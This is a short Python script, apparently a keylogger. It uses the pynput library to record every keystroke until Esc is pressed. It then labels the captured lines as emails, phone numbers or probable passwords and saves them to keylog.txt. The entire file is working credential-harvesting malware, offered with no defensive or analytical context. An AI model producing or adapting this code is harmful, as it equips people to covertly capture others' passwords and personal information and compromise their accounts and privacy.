import re
import pynput
from pynput.keyboard import Key, Listener

log = []

def on_press(key):
    try:
        if key == Key.enter:
            log.append('\n')
        elif key == Key.space:
            log.append(' ')
        elif hasattr(key, 'char') and key.char is not None:
            log.append(key.char)
        elif key == Key.tab:
            log.append('\t')
        elif key == Key.backspace:
            if log:
                log.pop()
        else:
            if not key == Key.shift:
                log.append(f'[{key.name}]')

    except Exception:
        pass

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

text = ''.join(log)
lines = text.split('\n')

email_regex = re.compile(r'[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]')
phone_regex = re.compile(r'(\+?\d{1,3}[-.\s]?)?(\(?\d{3}\)?[-.\s]?)?\d{3}[-.\s]?\d{4}')
password_regex = re.compile(r'^[\S]{6,}$') 

results = []
for line in lines:
    line = line.strip()
    if not line:
        continue
    if email_regex.search(line):
        results.append(f'[EMAIL] {line}')
    elif phone_regex.search(line):
        results.append(f'[PHONE] {line}')
    elif password_regex.fullmatch(line) and not email_regex.search(line):
        results.append(f'[PASSWORD?] {line}')
    else:
        results.append(f'[TEXT] {line}')


with open("keylog.txt", "w", encoding="utf-8") as f:
    f.write('\n'.join(results))